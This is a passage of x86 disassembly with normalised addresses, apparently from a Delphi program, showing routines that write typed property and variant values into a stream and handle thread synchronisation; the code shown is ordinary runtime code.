push sub_41f30a
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
retn
sub_41f314
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41ed78
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f3d6 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414924
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push ebp
call sub_41eda8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ee00
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41eeb4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41efdc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f204
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f27c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ee5c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f128
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414924
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f47c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f4c4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42028c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4cb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f4d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41f556
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41469c
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_4204c8
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4146a8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4202e0
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_4202e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f55d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f564
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41f5c4
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417afc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41eb90
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41eacc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5cb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41f5d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f666
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4040a0
xor eax eax
push ebp
push sub_41f649
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_404008
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e3f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f650
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_40405c
retn
sub_41f674
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f728
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414924
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41f564
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f72f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e3a8
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_4146a8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eacc
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f4d0
pop ecx
jmp r-xdata
jmp r-xdata
sub_41f734
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e54
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ea3c
mov esp ebp
pop ebp
retn
sub_41f774
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415270
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ec04
pop ecx
pop ecx
pop ebp
retn
sub_41f7b0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f805
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414c98
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f80c
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
sub_41f828
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f917
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40405c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f91e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404008
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404314
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41f810
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404388
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41f828
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404388
jmp r-xdata
sub_41f950
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fb44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414924
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4204c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb4b
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40402c
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4040a0
xor eax eax
push ebp
push sub_41fac5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40426c
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_404388
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ecb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_40405c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414924
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41f828
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41eacc
jmp r-xdata
sub_41fb5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fc19
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d080
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4204c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc20
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_405874
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f828
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41eacc
sub_41fc38
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fcd3
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151f8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_40354c
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_40426c
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eacc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4204c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcda
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41fce0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fd39
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415178
mov eax [ ebp + 0x8 ]
push eax
call sub_41f47c
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41fe90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd40
lea eax [ ebp - 0x10 ]
call sub_40ed6c
retn
sub_41fd44
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_4204dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f314
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41ed78
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414924
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41fe02 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414924
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41f674
pop ecx
jmp r-xdata
push ebp
call sub_41f734
pop ecx
jmp r-xdata
push ebp
call sub_41f7b0
pop ecx
jmp r-xdata
push ebp
call sub_41f950
pop ecx
jmp r-xdata
push ebp
call sub_41fc38
pop ecx
jmp r-xdata
push ebp
call sub_41fce0
pop ecx
jmp r-xdata
push ebp
call sub_41f774
pop ecx
jmp r-xdata
push ebp
call sub_41fb5c
pop ecx
sub_41fe90
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42026c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_413f74
test al al
je r-xdata
mov eax ebx
call sub_413e0c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411060
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eaa8
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f710
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41eb90
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412798
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420414
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420273
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x34 ]
call sub_405874
lea eax [ ebp - 0x30 ]
call sub_404008
lea eax [ ebp - 0x2c ]
call sub_4046e8
lea eax [ ebp - 0x1c ]
call sub_405874
retn
xor eax eax
push ebp
push sub_420210
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_41426c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41ff0e ]
mov eax ebx
call sub_4101d4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41ec04
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410b18
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412070
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4203c0
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405874
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_412d70
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d080
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_4204c8
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4204c8
jmp r-xdata
mov eax ebx
call sub_411060
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ea60
jmp r-xdata
mov eax ebx
call sub_411060
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ea3c
jmp r-xdata
mov eax ebx
call sub_4119bc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ea84
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412070
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4203c0
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_4204c8
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_4204c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4201ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4201a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031e0
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_40426c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_4203c0
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e2a8
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e2a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201ac
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_4201ac
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_4204c8
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e2a8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e2a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403290
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_42028c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4202d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404314
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4202e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202d9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_4202e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2a8
mov eax esi
call sub_4044c8
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e2a8
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420328
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404414
je r-xdata
mov eax esi
call sub_4042c8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042c8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2a8
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e2a8
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2a8
mov dl 0x6
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2a8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e2a8
sub_4203c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420405
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405ce8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42040c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_420414
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4204ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405b98
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov edi eax
mov eax ebx
call sub_404854
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_4204c8
mov eax ebx
call sub_404854
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e2a8
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e2a8
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404290
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420328
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4204c1
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_4204dc
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420574
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
call sub_42054c
mov eax ebx
call sub_420558
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420702
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
